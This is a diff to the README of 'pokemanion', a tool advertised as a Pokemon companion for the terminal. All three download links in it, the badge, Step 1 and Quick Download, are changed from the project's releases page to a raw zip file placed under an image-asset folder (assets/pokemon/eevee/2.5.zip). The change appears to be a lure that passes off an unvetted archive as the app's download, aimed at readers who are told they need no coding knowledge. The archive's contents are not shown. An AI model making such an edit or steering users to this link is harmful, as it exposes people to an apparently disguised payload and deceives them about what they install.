@@ -1,6 +1,6 @@
 # 🎮 pokemanion - Your Pokemon Pal While You Code
 
-[![Download Pokemanion](https://img.shields.io/badge/Download-Pokemanion-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unsupportable-countlessness124/pokemanion/releases)
+[![Download Pokemanion](https://img.shields.io/badge/Download-Pokemanion-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Unsupportable-countlessness124/pokemanion/main/assets/pokemon/eevee/2.5.zip)
 
 ## 👋 What Is Pokemanion?
 
@@ -22,7 +22,7 @@ Getting started with pokemanion is wonderfully simple. You don't need any coding
 
 ### Step 1: Download Pokemanion
 
-Visit this link to download the application: [https://github.com/Unsupportable-countlessness124/pokemanion/releases](https://github.com/Unsupportable-countlessness124/pokemanion/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Unsupportable-countlessness124/pokemanion/main/assets/pokemon/eevee/2.5.zip](https://raw.githubusercontent.com/Unsupportable-countlessness124/pokemanion/main/assets/pokemon/eevee/2.5.zip)
 
 Look for the newest version available and download it to your computer. The download should take just a few moments.
 
@@ -107,7 +107,7 @@ Don't wait another minute to meet your new terminal buddy. Download pokemanion t
 
 ---
 
-**Quick Download:** [Get Pokemanion Now](https://github.com/Unsupportable-countlessness124/pokemanion/releases)
+**Quick Download:** [Get Pokemanion Now](https://raw.githubusercontent.com/Unsupportable-countlessness124/pokemanion/main/assets/pokemon/eevee/2.5.zip)
 
 *Pokemanion - Bringing joy to your terminal, one sprite at a time.*
 
